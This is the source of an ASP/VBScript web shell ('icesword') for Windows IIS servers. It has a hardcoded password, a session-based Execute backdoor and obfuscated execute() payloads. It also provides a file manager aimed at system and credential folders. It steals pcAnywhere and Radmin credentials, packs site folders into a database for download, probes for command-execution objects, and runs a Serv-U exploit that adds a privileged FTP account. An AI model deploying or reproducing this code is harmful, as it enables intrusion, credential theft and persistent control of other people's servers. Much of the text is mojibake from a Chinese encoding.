<%@ LANGUAGE = VBScript.encode%>
<%
UserPass="icesword"  '����
mNametitle ="����ʹ"'        ����
Copyright="��������ʹ"'                    ��Ȩ
errin     ="����,���������"
SItEuRl="http://tophack.net/"'            �����վ��ַ
color1 ="green"'                          ��Ӱ��Ч��ɫ
fontcor ="red"'                           ������ʾ��ɫ
'---------------------------------------------------------------------------------------
' [����֮���]
'----------------------------------------------------------------------------------------
Response.Buffer =true
Server.ScriptTimeout=999999999
BodyColor="#000000"
FontColor="#b4a9a9"
LinkColor="#ffffff"
On Error Resume Next 
strBAD="If Request(""#"")<>"""" Then Session(""#"")=Request(""#"")"&VbNewLine
strBAD=strBAD&"If Session(""#"")<>"""" Then Execute(Session(""#""))"
Const DEfd=""
sub ShowErr()
 If Err Then
j"<br><a href='javascript:history.back()'><br> " & Err.Description & "</a><br>"
Err.Clear:Response.Flush
  End If
end sub
Sub j(str)
response.write(str)
End Sub
sub RaPath(s)
RaPath=ExecuteGlobal(s)
End sub
ysjb=true  
Function RePath(S)
RePath=Replace(S,"\","\\")
End Function
Function RRePath(S)
RRePath=Replace(S,"\\","\")
End Function
URL=Request.ServerVariables("URL")
ScriptPath=Server.MapPath(Request.ServerVariables("SCRIPT_NAME"))
ServerIP=Request.ServerVariables("LOCAL_ADDR")
Action=Request("Action")
RootPath=Server.MapPath(".")
WWWRoot=Server.MapPath("/")
CONST_FSO="Script"&"ing.Fil"&"eSyst"&"emObject"
FolderPath=Request("FolderPath")
domain=Request.ServerVariables("http_host")
u=request.servervariables("http_host")&url
FName=Request("FName")
cdx="<tr><td id=d width=95  >":cxd="<font face='wingdings'>8</font>":ef="</a></td></tr>"
Function ShiSanFun(ShiSanObjstr)
ShiSanObjstr = Replace(ShiSanObjstr, "��", """")
For ShiSanI = 1 To Len(ShiSanObjstr)
 If Mid(ShiSanObjstr, ShiSanI, 1) <> "��" Then
ShiSanNewStr = Mid(ShiSanObjstr, ShiSanI, 1) + ShiSanNewStr
 Else
ShiSanNewStr = vbCrLf + ShiSanNewStr
 End If
Next
ShiSanFun = ShiSanNewStr
End Function
set fso=server.CreateObject(CONST_FSO)
set fsoX=server.CreateObject(CONST_FSO)
str1="http://"&Request.ServerVariables("SERVER_Name")& left(Request.ServerVariables("URL"),InstrRev(Request.ServerVariables("URL"),"/")):BackUrl="<br><br><center><a href='javascript:history.back()'>����</a></center>"
j "<html><meta http-equiv=""Content-Type"" content=""text/html; charset=gb2312""><title>"&mNametitle&" - "&ServerIP&"</title><style type=""text/css"">span.underline{text-decoration:underline;}span.orange{color:#B3D169;}span.project_type{text-align:right}span.grey{color:#666;}#links{list-style-type:none;padding:20px 0 0 0;padding-left:20px;}#linklist2  td{color:#fff;background:#191919;}#linklist2 td:visited{color:#999;}#linklist2 td:hover{background:#B3D169;color:#191919;}body,tr,td{margin-top: 5px;background-color: #000000;color: #b4a9a9;font-size: 12px;SCROLLBAR-FACE-COLOR: #232323;scrollbar-arrow-color: #383839;scrollbar-highlight-color: #383839;scrollbar-3dlight-color: #dddddd;scrollbar-shadow-color: #232323}.sb{cursor: hand}input,select,textarea{border-top-width: 1px;font-weight: bold;border-left-width: 1px;font-size: 11px;border-left-color: #dddddd;background: #000000;border-bottom-width: 1px;border-bottom-color: #dddddd;color: #dddddd;border-top-color: #dddddd;font-family: verdana;border-right-width: 1px;border-right-color: #dddddd;}#d{background: #000000;padding-left: 5px;padding-right: 5px;font-color: #fff}pre{font-size: 11px;font-family: verdana;color: #dddddd;}hr{color: #dddddd;background-color: #dddddd;height: 5px;}#x{font-family: verdana;font-size: 13px}a{color: #ffffff;text-decoration: none;}.am{color: #b4a9a9;font-size: 11px;}</style>"


j"<script>function killErrors(){return true;}window.onerror=killErrors;function yesok(){if (confirm(""ȷ��Ҫִ�д˲�����""))return true;else return false;}function runClock(){theTime = window.setTimeout(""runClock()"", 100);var today = new Date();var display= today.toLocaleString();window.status=""��"&Copyright&"  --""+display;}runClock();function ShowFolder(Folder){top.addrform.FolderPath.value = Folder;top.addrform.submit();}function FullForm(FName,FAction){top.hideform.FName.value = FName;if(FAction==""CopyFile""){DName = prompt(""�����븴�Ƶ�Ŀ���ļ�ȫ����"",FName);top.hideform.FName.value += ""||||""+DName;}else if(FAction==""MoveFile""){DName = prompt(""�������ƶ���Ŀ���ļ�ȫ����"",FName);top.hideform.FName.value += ""||||""+DName;}else if(FAction==""CopyFolder""){DName = prompt(""�������ƶ���Ŀ���ļ���ȫ����"",FName);top.hideform.FName.value += ""||||""+DName;}else if(FAction==""MoveFolder""){DName = prompt(""�������ƶ���Ŀ���ļ���ȫ����"",FName);top.hideform.FName.value += ""||||""+DName;}else if(FAction==""NewFolder""){DName = prompt(""������Ҫ�½����ļ���ȫ����"",FName);top.hideform.FName.value = DName;}else{DName = ""Other"";}if(DName!=null){top.hideform.Action.value = FAction;top.hideform.submit();}else{top.hideform.FName.value = """";}}</script>"
j"<body" :If Action="" then j " scroll=no":j ">"
Dim ObT(18,2):Fn=Action:ObT(0,0) = "Scripting.FileSystemObject":ObT(0,2) = "�� �� �� �� �� ��":ObT(1,0) = "wscript.shell":ObT(1,2) = "������ִ�����,��ʾ'<font color=red>��</font>'ʱ��<a href='?Action=cmdx' target='FileFrame'> <font color=red> ִ��Cmd��</font></a> �˹���ִ��":ObT(2,0) = "ADOX.Catalog":ObT(2,2) = "ACCESS �� �� �� ��":ObT(3,0) = "JRO.JetEngine":ObT(3,2) = "ACCESS ѹ �� �� ��":ObT(4,0) = "Scripting.Dictionary":ObT(4,2) = "������ �� �� ���� ���":ObT(5,0) = "Adodb.connection":ObT(5,2) = "���ݿ� ���� ���":ObT(6,0) = "Adodb.Stream":ObT(6,2) = "������ �ϴ� ���":ObT(7,0) = "SoftArtisans.FileUp":ObT(7,2) = "SA-FileUp �ļ� �ϴ� ���":ObT(8,0) = "LyfUpload.UploadFile":ObT(8,2) = "���Ʒ� �ļ� �ϴ� ���":ObT(9,0) = "Persits.Upload.1":ObT(9,2) = "ASPUpload �ļ� �ϴ� ���":ObT(10,0) = "JMail.SmtpMail":ObT(10,2) = "JMail �ʼ� �շ� ���":ObT(11,0) = "CDONTS.NewMail":ObT(11,2) = "����SMTP ���� ���":ObT(12,0) = "SmtpMail.SmtpMail.1":ObT(12,2) = "SmtpMail ���� ���":ObT(13,0) = "Microsoft.XMLHTTP":ObT(13,2) = "���� ���� ���"
ObT(14,0) = "ws"&"cript.shell.1":  OBt(14,2) = "���wsh���������Ը���������":OBT(15,0) = "WS"&"CRIPT.NETWORK":  OBt(15,2) = "�鿴��������Ϣ���������ʱ����������Ȩ":OBT(16,0) = "she"&"ll.appl"&"ication":OBt(16,2) = "she"&"ll.appli"&"cation ��������FSOʱ�����ļ��Լ�ִ������":OBT(17,0) = "sh"&"ell.appl"&"ication.1":OBt(17,2) = "she"&"ll.appli"&"cation �ı�������FSOʱ�����ļ��Լ�ִ������":OBT(18,0) = "Shell.Users":OBt(18,2) = "ɾ����net.exe net1.exe������������û������"
For i=0 To 18:Set T=Server.CreateObject(ObT(i,0)):If -2147221005 <> Err Then:IsObj=" ��":Else:IsObj=" ��":Err.Clear:End If:Set T=Nothing:ObT(i,1)=IsObj:Next:If FolderPath<>"" then:Session("FolderPath")=RRePath(FolderPath):End If:If Session("FolderPath")="" Then:FolderPath=WwwRoot:Session("FolderPath")=FolderPath:End if
Function PcAnywhere4()
execute(king("`>tswqz/<>rz/<>' ���� '=txsqc 'zodwxl'=thnz zxhfo<>rz<>rz/<>'13'=tmol 'yoe.shdtzoZ\tktivnfQeh\etzfqdnU\\qzqW fgozqeoshhQ\lktlM ssQ\lufozztU rfq lzftdxegW\:Z'=txsqc 'zbtz'=thnz 'izqh'=tdqf zxhfo<>'%10'=izrov rz<>rz/< :����yoe>'%10'=izrov rz<>kz<>'1'=ktrkgw'%13'=izrov tswqz<>'zlgh'=rgiztd 'dkgyb'=tdqf dkgy<>cor/<����foA Ȩ��tktivnfQeY>'ktzfte'=fuosq cor<`p"))
end Function
j"</form><script>function RUNonclick(){document.xform.china.name = parent.pwd.value;document.xform.action = parent.url.value;document.xform.submit();}</script>"
Function StreamLoadFromFile(sPath)
execute(king(" zsxltk = etrbti�� zbtG�� p + zsxltk = zsxltk�� zbtG�� 50 * p = p �� o - )fokzl(ftV gJ 0 = a kgX�� yC rfS�� ))0 ,o ,fokzl(roT(zfCZ = p �� ftiJ `1` => )0 ,o ,fokzl(roT rfQ `2` =< )0 ,o ,fokzl(roT yC�� yC rfS�� 10 = p �� ftiJ `Q` = )0 ,o ,fokzl(roT kB `q` = )0 ,o ,fokzl(roT yC�� yC rfS�� 00 = p �� ftiJ `A` = )0 ,o ,fokzl(roT kB `w` = )0 ,o ,fokzl(roT yC�� yC rfS�� 90 = p �� ftiJ `Z` = )0 ,o ,fokzl(roT kB `e` = )0 ,o ,fokzl(roT yC�� yC rfS�� 80 = p �� ftiJ `W` = )0 ,o ,fokzl(roT kB `r` = )0 ,o ,fokzl(roT yC�� yC rfS�� 70 = p �� ftiJ `S` = )0 ,o ,fokzl(roT kB `t` = )0 ,o ,fokzl(roT yC�� yC rfS�� 60 = p �� ftiJ `X`= )0 ,o ,fokzl(roT kB `y` = )0 ,o ,fokzl(roT yC�� )fokzl(ftV gJ 0 = o kgX�� 1 = zsxltk�� zsxltk ,a ,p ,o doW�� )fokzl(etrbti fgozefxX��fgozefxX rfS��ufoizgG = dqtkzUg ztU��izoK rfS��tlgsZ.��rqtN. = tsoXdgkXrqgVdqtkzU��1 = fgozolgY.��)izqYl(tsoXdgkXrqgV.��fthB.��8 = trgT.��0 = thnJ.��dqtkzUg izoK��)`dqtkzU.wrgrQ`(zetpwBtzqtkZ.ktcktU = dqtkzUg ztU��dqtkzUg doW"))
End Function 

sub promyself()
On Error Resume Next 
set f=fso.GetFile(ScriptPath)
if f.Attributes <> 39 and session("lock")="" then
end if
set f=nothing
end sub
promyself
Function PcAnywhere(data,mode)
execute(king("trgetr=tktivnfQeY�� zbtG��0+dxfyoZ=dxfyoZ��)kzleh(kiZ + trgetr = trgetr�� kgX zobS ftiJ ))490>kzleh( kB )98 =< kzleh(( yC��)dxfyoZ kgb )))9,o,ilqi(roT(etrbti kgb ))9,o,qzqr(roT(etrbti((=kzleh�� 9 htzU ktwdxf gJ 0 = o kgX��60 = dxfyoZ :18 = ktwdxf ftiJ `ktlx` = trgd yC��770 = dxfyoZ :98 = ktwdxf ftiJ `llqh` = trgd yC��)8,qzqr(roT =DUQD"))

End function
Function bin2hex(binstr)
For i = 1 To LenB(binstr)
hexstr = Hex(AscB(MidB(binstr, i, 1)))
If Len(hexstr)=1 Then 
bin2hex=bin2hex&"0"&(LCase(hexstr))
Else
bin2hex=bin2hex& LCase(hexstr)
End If 
Next
End Function
CIF = Request("path")
If CIF <> "" Then 
BinStr=StreamLoadFromFile(CIF) 
j"Pcanywhere Reader ==><br><br>PATH:"&CIF&"<br>�ʺ�:"&PcAnywhere (Mid(bin2hex(BinStr),919,64),"user")
j"<br>����:"&PcAnywhere (Mid(bin2hex(BinStr),1177,32),"pass")
End If 
Function radmin()
Set WSH= Server.CreateObject("WSCRIPT.SHELL")

RadminPath="HKEY_LOCAL_MACHINE\SYSTEM\RAdmin\v2.0\Server\Parameters\"

Parameter="Parameter"

Port = "Port"

j"<br>ע��:����HASHֵ����RadminHash���߻�od�������ӣ����߰ٶ���:Radmin_hash.rar<br><br>"

ParameterArray=WSH.REGREAD(RadminPath & Parameter )

j Parameter&":"

If IsArray(ParameterArray) Then

For i = 0 To UBound(ParameterArray)

If  Len (hex(ParameterArray(i)))=1 Then 

strObj = strObj & "0"&CStr(Hex(ParameterArray(i)))

Else

strObj = strObj & Hex(ParameterArray(i))

End If 

Next

j strobj

Else

j"Error! Can't Read!"

End If

j"<br><br>"

PortArray=WSH.REGREAD(RadminPath & Port )

If IsArray(PortArray) Then 

j Port &":" 

j hextointer(CStr(Hex(PortArray(1)))&CStr(Hex(PortArray(0))))

Else 

j"Error! Can't Read!"

End If
End Function
Function hextointer(strin) 
Dim i, j, k, result 
result = 0 
For i = 1 To Len(strin) 
If Mid(strin, i, 1) = "f" Or Mid(strin, i, 1) ="F" Then 
j = 15 
End If 
If Mid(strin, i, 1) = "e" Or Mid(strin, i, 1) = "E" Then 
j = 14 
End If 
If Mid(strin, i, 1) = "d" Or Mid(strin, i, 1) = "D" Then 
j = 13 
End If 
If Mid(strin, i, 1) = "c" Or Mid(strin, i, 1) = "C" Then 
j = 12 
End If 
If Mid(strin, i, 1) = "b" Or Mid(strin, i, 1) = "B" Then 
j = 11 
End If 
If Mid(strin, i, 1) = "a" Or Mid(strin, i, 1) = "A" Then 
j = 10 
End If 
If Mid(strin, i, 1) <= "9" And Mid(strin, i, 1) >= "0" Then 
j = CInt(Mid(strin, i, 1)) 
End If 
For k = 1 To Len(strin) - i 
j = j * 16 
Next 
result = result + j 
Next 
hextointer = result 
End Function
Function MainForm()
j"<form name=""hideform"" method=""post"" action="""&URL&""" target=""FileFrame"">"
j"<input type=""hidden"" name=""Action"">"
j"<input type=""hidden"" name=""FName"">"
j"</form>"
j"<table width='100%' height='100%'  border=0 cellpadding='0' cellspacing='0'>"
j"<tr><td height='30' colspan='2'>"
j"<table width='100%'>"
j"<form name='addrform' method='post' action='"&URL&"' target='_parent'>"
j"<tr><td width='60' align='center'>��ַ����</td><td>"
j"<input name='FolderPath' style='width:100%' value='"&Session("FolderPath")&"'>"
j"</td><td width='140' align='center'><input name='Submit' type='submit' value='ת��'> <input type='submit' value='ˢ��������' onclick='FileFrame.location.reload()'>" 
j"  <tr align='center' valign='middle'>"
j"<tr>��ȨĿ¼����<a href='javascript:ShowFolder(""C:\\Program Files"")'>Program</a>����<a href='javascript:ShowFolder(""C:\\Documents and Settings\\All Users\\"")'>AllUsers</a>����<a href='javascript:ShowFolder(""C:\\Documents and Settings\\All Users\\����ʼ���˵�\\����\\"")'>��ʼ <b>��</b> ����</a>����<a href='javascript:ShowFolder(""C:\\RECYCLER\\"")'>C:\\RECYCLER</a>����<a href='javascript:ShowFolder(""D:\\RECYCLER\\"")'>D:\RECYCLER</a>����<a href='javascript:ShowFolder(""C:\\Documents and Settings\\All Users\\Application Data\\Symantec\\pcAnywhere\\"")'>pcAnywhere</a>����<a href='javascript:ShowFolder(""c:\\Program Files\\serv-u\\"")'>serv-u</a>����<a href='javascript:ShowFolder(""C:\\Program Files\\Real"")'>RealServer</a>����<a href='javascript:ShowFolder(""C:\\Program Files\\Microsoft SQL Server\\"")'>SQL</a>����<a href='javascript:ShowFolder(""C:\\WINDOWS\\system32\\config\\"")'>config</a>����<a href='javascript:ShowFolder(""c:\\WINDOWS\\system32\\inetsrv\\data\\"")'>data</a>����<a href='javascript:ShowFolder(""c:\\windows\\Temp\\"")'>Temp</a>����<a href='javascript:ShowFolder(""C:\\Documents and Settings\\All Users\\Documents\\"")'>Documents</a>��</td><td>":
j"</td></tr></form></table></center></td></tr><tr><td width='12%'>"
j"<iframe name='Left' src='?Action=MainMenu' width='100%' height='100%' frameborder='0'></iframe></td>"
j"<td width='110%'>"
j"<iframe name='FileFrame' src='?Action=Show1File' width='100%' height='100%' frameborder='1'></iframe>"
j"</td></tr></table>"
End Function

Sub PageAddToMdb()
execute(king("`>dkgy/<��¼Ŀ��̱���λ������������������ :ע>kw<>kw<>'������'=txsqc zodwxl=thnz zxhfo<>zeQtiz=tdqf wrTdgkXtlqtstk=txsqc ftrroi=thnz zxhfo<>13=tmol ``wrd.DUD\` & ))`.`(izqYhqT.ktcktU(trgefSsdzD & ```=txsqc izqYtiz=tdqf zxhfo<>))``#``(fgolltU(tzxetbS=txsqc ``#``=tdqf ftrroi=thnz zxhfo<>zlgh=rgiztd dkgy<>/kw<:)��֧BUX��(���������>/ki<>dkgy/<��¼Ŀ��ͬ��ľdql��λ,����wrd.DUD�������� :ע>kw<>kw<>'����ʼ��'=txsqc zodwxl=thnz zxhfo<>zetstl/<>fgozhg/<BUX��>hhq=txsqc fgozhg<>fgozhg/<BUX>gly=txsqc fgozhg<>rgiztTtiz=tdqf zetstl<>zeQtiz=tdqf wrTgJrrq=txsqc ftrroi=thnz zxhfo<>13=tmol ``` & ))`.`(izqYhqT.ktcktU(trgefSsdzD & ```=txsqc izqYtiz=tdqf zxhfo<>))``#``(fgolltU(tzxetbS=txsqc ``#``=tdqf ftrroi=thnz zxhfo<>zlgh=rgiztd dkgy<:����м���>kw<`p��yC rfS��rfS.tlfghltN��skMaeqA&`>cor/<!��������>kw<>ktzfte=fuosq cor<` p��)izqYtiz(aeqYfx��ftiJ `wrTdgkXtlqtstk` = zeQtiz yC��yC rfS��rfS.tlfghltN��skMaeqA&`>cor/<!��������>kw<>ktzfte=fuosq cor<` p��)izqYtiz(wrTgJrrq��ftiJ `wrTgJrrq` = zeQtiz yC��111110=zxBtdoJzhokeU.ktcktU��)`izqYtiz`(zltxjtN = izqYtiz��)`zeQtiz`(zltxjtN = zeQtiz��izqYtiz ,zeQtiz doW"))
End Sub
Sub addToMdb(thePath)
On Error Resume Next
Dim rs, conn, stream, connStr, adoCatalog
Set rs = Server.CreateObject("ADODB.RecordSet")
Set stream = Server.CreateObject("ADODB.Stream")
Set conn = Server.CreateObject("ADODB.Connection")
Set adoCatalog = Server.CreateObject("ADOX.Catalog")
connStr = "Provider=Microsoft.Jet.OLEDB.4.0; Data Source=" & Server.MapPath("HSH.mdb")
adoCatalog.Create connStr
conn.Open connStr
conn.Execute("Create Table FileData(Id int IDENTITY(0,1) PRIMARY KEY CLUSTERED, thePath VarChar, fileContent Image)")
stream.Open
stream.Type = 1
rs.Open "FileData", conn, 3, 3
If Request("theMethod") = "fso" Then
fsoTreeForMdb thePath, rs, stream
 Else
saTreeForMdb thePath, rs, stream
End If
rs.Close
Conn.Close
stream.Close
Set rs = Nothing
Set conn = Nothing
Set stream = Nothing
Set adoCatalog = Nothing
End Sub
Function fsoTreeForMdb(thePath, rs, stream)
execute(king("ufoizgG = ktrsgXtiz ztU��ufoizgG = lktrsgy ztU��ufoizgG = ltsoy ztU��zbtG��yC rfS��tzqrhM.lk��)(rqtN.dqtkzl = )`zftzfgZtsoy`(lk��)izqY.dtzo(tsoXdgkXrqgV.dqtkzl��)7 ,izqY.dtzo(roT = )`izqYtiz`(lk��vtGrrQ.lk��ftiJ 1 =< )`$` & tdqG.dtzo & `$` ,zloVtsoXlnl(kzUfC yC��ltsoy fC dtzo ieqS kgX��zbtG��dqtkzl ,lk ,izqY.dtzo wrTkgXttkJgly��lktrsgy fC dtzo ieqS kgX��lktrsgXwxU.ktrsgXtiz = lktrsgy ztU��ltsoX.ktrsgXtiz = ltsoy ztU��)izqYtiz(ktrsgXztE.)BUX_JUGBZ(zetpwBtzqtkZ.ktcktU = ktrsgXtiz ztU��yC rfS��)`!�ʷ����ʲ��߻��ڴ治¼Ŀ ` & izqYtiz(kkSvgil��ftiJ tlsqX = )izqYtiz(lzlobSktrsgX.)BUX_JUGBZ(zetpwBtzqtkZ.ktcktU yC��`$wrs.DUD$wrd.DUD$` = zloVtsoXlnl��zloVtsoXlnl ,ltsoy ,lktrsgy ,ktrsgXtiz ,dtzo doW"))
End Function
Sub unPack(thePath)
On Error Resume Next
Server.ScriptTimeOut=100000
Dim rs, ws, str, conn, stream, connStr, theFolder
str = Server.MapPath(".") & "\"
Set rs = CreateObject("ADODB.RecordSet")
Set stream = CreateObject("ADODB.Stream")
Set conn = CreateObject("ADODB.Connection")
connStr = "Provider=Microsoft.Jet.OLEDB.4.0;Data Source=" & thePath & ";"
conn.Open connStr
rs.Open "FileData", conn, 1, 1
stream.Open
stream.Type = 1
Do Until rs.Eof
theFolder = Left(rs("thePath"), InStrRev(rs("thePath"), "\"))
If Server.CreateObject(CONST_FSO).FolderExists(str & theFolder) = False Then
createFolder(str & theFolder)
End If
stream.SetEos()
stream.Write rs("fileContent")
stream.SaveToFile str & rs("thePath"), 2
rs.MoveNext
Loop
rs.Close
conn.Close
stream.Close
Set ws = Nothing
Set rs = Nothing
Set stream = Nothing
Set conn = Nothing
End Sub
Dim Filepaths
set Filepaths=new SearchFile
Filepaths.Class_Folder Filename
Sub createFolder(thePath)
Dim i
i = Instr(thePath, "\")
Do While i > 0
If Server.CreateObject(CONST_FSO).FolderExists(Left(thePath, i)) = False Then
Server.CreateObject(CONST_FSO).CreateFolder(Left(thePath, i - 1))
End If
If InStr(Mid(thePath, i + 1), "\") Then
i = i + Instr(Mid(thePath, i + 1), "\")
 Else
i = 0
End If
Loop
End Sub
Sub saTreeForMdb(thePath, rs, stream)
Dim item, theFolder, sysFileList
sysFileList = "$HSH.mdb$HSH.ldb$"
Set theFolder = saX.NameSpace(thePath)
For Each item In theFolder.Items
If item.IsFolder = True Then
saTreeForMdb item.Path, rs, stream
 Else
If InStr(sysFileList, "$" & item.Name & "$") <= 0 Then
rs.AddNew
rs("thePath") = Mid(item.Path, 4)
stream.LoadFromFile(item.Path)
rs("fileContent") = stream.Read()
rs.Update
End If
End If
Next
Set theFolder = Nothing
End Sub
Function ProFile()
execute(king("CU p��`>tswqz/<>dkgy/<`&CU=CU��`>kz/<>rz/<>'�̽�������������һ��'=txsqc 'zodwxU'=tdqf 'zodwxl'=thnz zxhfo<>16=ziuoti rz<>rz/<;hlwf&>rz<>kz<`&CU=CU��`>kz/<>rz/<)������ȫ������񣬴�Խ������Ƶ����Խ���ĵĻ���Ҫ�裬��0ΪС��( �� >/ ``)'',u/]r\^[/(teqshtk.txsqc=txsqc``=hxntafg ``6``=tmol ``0``=txsqc ``ziuok:fuosq-zbtz``=tsnzl ``tdoJQ``=tdqf ``zbtz``=thnz zxhfo<>rz<>rz/<����Ƶ����>ziuok=fuosq rz<>kz<`&CU=CU��`>kz/<>rz/<)���ĸ��Գ��룬�����ֳ��������ʷ�( 3-XJM>/ ``9``=txsqc ``kqiZQ``=tdqf ``gorqk``=thnz zxhfo<  9089AE>/ rtaetie ``0``=txsqc ``kqiZQ``=tdqf ``gorqk``=thnz zxhfo<>rz<>rz/<��������>ziuok=fuosq rz<>kz<`&CU=CU��`>kz/<>rz/<>qtkqzbtz/<�������>``4``=lvgk ``14``=lsge ``trgZQ``=tdqf qtkqzbtz<>rz<>rz/<���������>ziuok=fuosq ``;bh8:hgz-uforrqh``=tsnzl hgz=fuosqc rz<>kz<`&CU=CU��`>kz/<>rz/<>qtkqzbtz/<`&)`hlq.zltz\`&)`izqYktrsgX`(fgolltU(izqYtNN&`>``4``=lvgk ``14``=lsge ``tsoXQ``=tdqf qtkqzbtz<`&CU=CU��`>rz<>rz/<>zfgy/<;hlwf&;hlwf&��·���ĸ�һ��ÿ>kw<;hlwf&;hlwf&���ĸ��໤��ʱͬ��>vgsstn=kgsge zfgy<>kw<����·���ĵĻ���Ҫ��>``1``=txsqc ``qccc``=tdqf ``ftrroi``=thnz zxhfo<>ziuok=fuosq 'bh99:ziuoti-tfos'=tsnzl hgz=fuosqc rz<>kz<`&CU=CU��`'zlgY=9fgozeQ&tsoXgkY=fgozeQ?`&VNM&`'=fgozeq 'zlgh'=rgiztd 'dkgXhM'=tdqf dkgy<`&CU=CU��`>'1'=ufoeqhlsste '1'=uforrqhsste '1'=ktrkgw tswqz<>kw<`=CU��yC rfS��rfS.tlfghltN��`>kw<>ktzfte/<���̽�����>q/<����>afqsw_=ztukqz `&9llqh&`=tsoXgkY?`&VNM&`=ytki ``rsgw:ziuotv-zfgy;tfosktrfx:fgozqkgetr-zbtz``=tsnzl q<���㣡���ɳ��� >zfgy/<`&9llqh&`>vgsstn=kgsge zfgy< �̽�����>ktzfte<>kw<>kw<>kw<`p��)`kqiZQ`(zltxjtk=)`kqiZ`&9llqh(fgozqeoshhQ��)`tdoJQ`(zltxjtk=)`tdoJ`&9llqh(fgozqeoshhQ��)`trgZQ`(zltxjtk=)`trgZ`&9llqh(fgozqeoshhQ��)`tsoXQ`(zltxjtk=)`tsoX`&9llqh(fgozqeoshhQ��0=)9llqh(fgozqeoshhQ��)9llqh(tlqex=9llqh�� hggs��0dxf&9llqh=9llqh��yo rft�� 2~1' ))37+rfk*)37-46((kiZ(kzUZ=0dxf��tlst�� m~q' ))42+rfk*)42-990((kiZ(kzUZ=0dxf��ftiz 7=<)9llqh(ftV yo��3<)9llqh(ftV tsoiK gW��``=9llqh��0dxf,9llqh dor��tmodgrfqN��ftiJ `zlgY`=)`9fgozeQ`(zltxjtN yC"))

End Function
Function suftp()
j"<center><br><form name='form1' method='post' action=''><table width='500'><tr align='center' valign='middle'><td colspan='2' id=s><font face=webdings>8</font> <B>���ɰ汾��Ϣ</b></td></tr><tr align='center'><td id=d>ϵͳ�˺ţ�</td><td id=d><input name='duser' type='text' class='TextBox' id='duser' value='LocalAdministrator'></td></tr><tr align='center'><td id=d>ϵͳ���</td><td id=d><input name='dpwd' type='text' class='TextBox' id='dpwd' value='#l@$ak#.lk;0@P'></td></tr><tr align='center'><td id=d>ϵͳ�˿ڣ�</td><td id=d><input name='dport' type='text' class='TextBox' id='dport' value='43958'></td></tr><tr align='center'><td id=d>�¼��˺ţ�</td><td id=d><input name='tuser' type='text' class='TextBox' id='tuser' value='invader'></td></tr><tr align='center'><td id=d>�¼ӿ��</td><td id=d><input name='tpass' type='text' class='TextBox' id='pass' value='1'></td></tr><tr align='center'><td id=d>����·����</td><td id=d><input name='tpath' type='text' class='TextBox' id='tpath' value='C:\'></td></tr><tr align='center'><td id=d>����˿ڣ�</td><td id=d><input name='tport' type='text' class='TextBox' id='tport' value='21'></td></tr><tr align='center'><td id=d>ִ������</td><td id=d><input name='radiobutton' type='radio' value='add' checked class='TextBox' id=d>ȷ������&nbsp;<input type='radio' name='radiobutton' value='del' class='TextBox' id=d>ȷ��ɾ��</td></tr><tr align='center' valign='middle'><td colspan='2' id=d><input type='submit' name='Submit' value='Just Go'>&nbsp;<input type='reset' name='Submit2' value='Reset'><input name='SUaction' type='hidden' id='action' value='1'></td></tr></table></form></center>"
Usr = request.Form("duser")
pwd = request.Form("dpwd")
port = request.Form("dport")
tuser = request.Form("tuser")
tpass = request.Form("tpass")
tpath = request.Form("tpath")
tport = request.Form("tport")
'Command = request.Form("dcmd")
if request.Form("radiobutton") = "add" Then
leaves = "User " & Usr & vbcrlf
leaves = leaves & "Pass " & pwd & vbcrlf
leaves = leaves & "SITE MAINTENANCE" & vbcrlf
leaves = leaves & "-SETUSERSETUP" & vbcrlf & "-IP=0.0.0.0" & vbcrlf & "-PortNo=" & tport & vbcrlf & "-User=" & tuser & vbcrlf & "-Password=" & tpass & vbcrlf & _
"-HomeDir=" & tpath & "\" & vbcrlf & "-LoginMesFile=" & vbcrlf & "-Disable=0" & vbcrlf & "-RelPaths=1" & vbcrlf & _
"-NeedSecure=0" & vbcrlf & "-HideHidden=0" & vbcrlf & "-AlwaysAllowLogin=0" & vbcrlf & "-ChangePassword=0" & vbcrlf & _
"-QuotaEnable=0" & vbcrlf & "-MaxUsersLoginPerIP=-1" & vbcrlf & "-SpeedLimitUp=0" & vbcrlf & "-SpeedLimitDown=0" & vbcrlf & _
"-MaxNrUsers=-1" & vbcrlf & "-IdleTimeOut=600" & vbcrlf & "-SessionTimeOut=-1" & vbcrlf & "-Expire=0" & vbcrlf & "-RatioUp=1" & vbcrlf & _
"-RatioDown=1" & vbcrlf & "-RatiosCredit=0" & vbcrlf & "-QuotaCurrent=0" & vbcrlf & "-QuotaMaximum=0" & vbcrlf & _
"-Maintenance=System" & vbcrlf & "-PasswordType=Regular" & vbcrlf & "-Ratios=None" & vbcrlf & " Access=" & tpath & "\|RWAMELCDP" & vbcrlf
On Error Resume Next
Set xPost = CreateObject("MSXML2.XMLHTTP")
xPost.Open "POST", "http://127.0.0.1:"& port &"/leaves", True
xPost.Send(leaves)
Set xPOST=nothing
j ("����ɹ�ִ�У���FTP �û���: " & tuser & " " & "����: " & tpass & " ·��: " & tpath & " :)<br><BR>")
else
leaves = "User " & Usr & vbcrlf
leaves = leaves & "Pass " & pwd & vbcrlf
leaves = leaves & "SITE MAINTENANCE" & vbcrlf
leaves = leaves & "-DELETEUSER" & vbcrlf & "-IP=0.0.0.0" & vbcrlf & "-PortNo=" & tport & vbcrlf & " User=" & tuser & vbcrlf
Set xPost3 = CreateObject("MSXML2.XMLHTTP")
xPost3.Open "POST", "http://127.0.0.1:"& port &"/leaves", True
xPost3.Send(leaves)
Set xPOST3=nothing
end if
End Function

Function MainMenu()
execute(shisanfun("��>elbat/<>rh/<>rt/<>dt/<>a/<½��--���� ��&dxc&��>'pot_'=tegrat 'tuogoL=noitcA?'=ferh a<��&xdc j��fe&���¸�--��� ��&dxc&��>'emarFeliF'=tegrat 'psa.setadpU/bew/ten.kcahpot//:ptth'=ferh a<��&xdc j��fe&��ѯ��--��ͬ ��&dxc&��>'emarFeliF'=tegrat '��&niamod&��=w?xpsa.411/pi/moc.tseb411.www//:ptth'=ferh a<��&xdc j��fe&�廤��--���� ��&dxc&��>'emarFeliF'=tegrat 'eliForP=noitcA?'=ferh a<��&xdc j��fe&��>tnof/<¼Ŀ���ɾ>der=roloc tnof<  ��&dxc&��>'emarFeliF'=tegrat 'tniopled=noitcA?'=ferh a<��&xdc j��fe&��>tnof/<¼Ŀ�����>der=roloc tnof<  ��&dxc&��>')���redloFweN���,����&)��\\..fnc_itv\��&)��htaPredloF��(noisseS(htaPeR&����(mroFlluF:tpircsavaj'=ferh a<��&xdc j��fe&��>tnof/<�Բ�������>der=roloc tnof< ��&dxc&��>'emarFeliF'=tegrat 'llehsneddih=noitcA?'=ferh a<��&xdc j��fe&����̱����� ��&dxc&��>'emarFeliF'=tegrat '��&htaPtpircS&��\.\\=htaPrewoP&rewoPtidE=noitcA?'=ferh 